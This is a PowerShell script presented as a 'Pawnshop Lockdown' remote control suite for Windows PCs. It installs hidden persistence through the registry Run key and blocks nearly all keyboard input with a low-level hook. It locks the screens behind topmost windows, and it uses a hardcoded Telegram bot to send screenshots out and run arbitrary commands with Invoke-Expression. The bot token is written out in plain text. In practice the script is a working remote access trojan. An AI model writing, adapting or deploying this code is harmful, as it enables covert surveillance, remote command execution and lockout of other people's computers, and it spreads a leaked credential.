# ============================================
# Pawnshop Lockdown v6.0 – Remote Control Suite
# Supports: /lockPC, /unlockPC, /statusPC, /screenshotPC, /execPC <cmd>
# Persists on login, auto‐updates, lightweight & reliable
# ============================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIGURATION ---
$repoRaw      = 'https://raw.githubusercontent.com/diezul/x/main'
$scriptName   = 'pawnlock.ps1'
$githubURL    = "$repoRaw/$scriptName"
$installDir   = "$env:ProgramData\PawnshopLock"
$localScript  = "$installDir\$scriptName"
$imageURL     = "$repoRaw/69.jpeg"
$tempImage    = "$env:TEMP\pawnlock.jpg"
$botToken     = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID       = 656189986
$pcID         = $env:COMPUTERNAME.ToLower()
$user         = $env:USERNAME
$lockCmd      = "/lock$pcID"
$unlockCmd    = "/unlock$pcID"
$statusCmd    = "/status$pcID"
$screenshotCmd= "/screenshot$pcID"
$execPrefix   = "/exec$pcID "

# --- INSTALL (run once) ---
if (-not (Test-Path $installDir)) { New-Item $installDir -ItemType Directory -Force | Out-Null }
try { Invoke-WebRequest $githubURL -UseBasicParsing -OutFile $localScript } catch {}
# Persist on login
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
Set-ItemProperty -Path $runKey -Name 'PawnshopLock' -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localScript`"" -Force

# --- HELPERS ---
function Send-TG($text) {
    $p = @{ chat_id = $chatID; text = $text }
    try { Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body ($p|ConvertTo-Json) -ContentType 'application/json' } catch {}
}
function Send-Photo($path,$cap='') {
    try {
        $wc = New-Object Net.WebClient
        $boundary = [Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $header = "--$boundary$LF" +
                  "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatID$LF" +
                  "--$boundary$LF" +
                  "Content-Disposition: form-data; name=`"caption`"$LF$LF$cap$LF" +
                  "--$boundary$LF" +
                  "Content-Disposition: form-data; name=`"photo`"; filename=`"img.jpg`"$LF" +
                  "Content-Type: image/jpeg$LF$LF"
        $footer = "$LF--$boundary--$LF"
        $data = [Text.Encoding]::ASCII.GetBytes($header) + [IO.File]::ReadAllBytes($path) + [Text.Encoding]::ASCII.GetBytes($footer)
        $wc.Headers.Add("Content-Type","multipart/form-data; boundary=$boundary")
        $wc.UploadData("https://api.telegram.org/bot$botToken/sendPhoto","POST",$data) | Out-Null
    } catch {}
}
function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $bounds = [System.Windows.Forms.Screen]::AllScreens | Select-Object -First 1 | % { $_.Bounds }
    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $g   = [Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
    $file= "$env:TEMP\snap_$([guid]::NewGuid()).jpg"
    $bmp.Save($file,[Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose(); $bmp.Dispose()
    return $file
}

# --- BLOCKER CLASS ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyBlocker {
    private static IntPtr h=IntPtr.Zero;
    private delegate IntPtr P(int n,IntPtr w,IntPtr l);
    private static P proc=Hook;
    private const int WH=13, WM1=0x0100, WM2=0x0104;
    [DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);
    [DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
    [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
    public static void Block(){ if(h==IntPtr.Zero) h=SetWindowsHookEx(WH,proc,GetModuleHandle(null),0);}
    public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;}}
    private static IntPtr Hook(int n,IntPtr w,IntPtr l){
        if(n>=0&&(w==(IntPtr)WM1||w==(IntPtr)WM2)){
            int vk=Marshal.ReadInt32(l);
            if(vk==0x43) return CallNextHookEx(h,n,w,l);
            return (IntPtr)1;
        }
        return CallNextHookEx(h,n,w,l);
    }
}
"@
[KeyBlocker]::Block()

# --- SCREEN LOCK/UNLOCK ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms=$null
function Lock-Screen {
    if ($forms) { return }
    Invoke-WebRequest $imageURL -UseBasicParsing -OutFile $tempImage
    $forms = foreach($s in [System.Windows.Forms.Screen]::AllScreens){
        $f=New-Object Windows.Forms.Form -Property @{
            FormBorderStyle='None';WindowState='Maximized';TopMost=$true;Cursor='None';
            Location=$s.Bounds.Location;Size=$s.Bounds.Size;BackColor='Black'
        }
        $pb=New-Object Windows.Forms.PictureBox -Property @{
            Image=[Drawing.Image]::FromFile($tempImage);Dock='Fill';SizeMode='StretchImage'
        }
        $f.Controls.Add($pb);$f.Add_Deactivate({$f.Activate()});$f.Show();$f
    }
    Send-TG "🔒 $pcID locked. Unlock: $unlockCmd"
}
function Unlock-Screen {
    if (!$forms) { return }
    foreach($f in $forms){try{$f.Close()}catch{}}
    $forms=$null
    Send-TG "⚠️ $pcID unlocked. Lock: $lockCmd"
}

# --- INIT ---
Send-TG "🟢 $pcID online. Lock: $lockCmd | Status: $statusCmd"

# --- LISTENER ---
$off=0
try{ $u=Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=1&offset=$off" -TimeoutSec 2 }catch{}
while($true){
    try{
        $u=Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$off" -TimeoutSec 10
        foreach($m in $u.result){
            $off=$m.update_id+1
            $t=$m.message.text.ToLower()
            if($m.message.chat.id -ne $chatID){continue}
            if($t -eq $lockCmd)       { Lock-Screen }
            elseif($t -eq $unlockCmd) { Unlock-Screen }
            elseif($t -eq $statusCmd) {
                $st = if($forms) {'LOCKED'} else {'UNLOCKED'}
                Send-TG "📍 $pcID is $st"
            }
            elseif($t -eq $screenshotCmd){
                $p=Take-Screenshot; Send-Photo $p "Screenshot $pcID"; Remove-Item $p -Force
            }
            elseif($t.StartsWith($execPrefix)){
                $cmd=$t.Substring($execPrefix.Length)
                $out=try{Invoke-Expression $cmd 2>&1|Out-String}catch{$_.Message}
                Send-TG "🖥 $pcID exec:`n$out"
            }
        }
    }catch{}
    Start-Sleep -Seconds 3
}
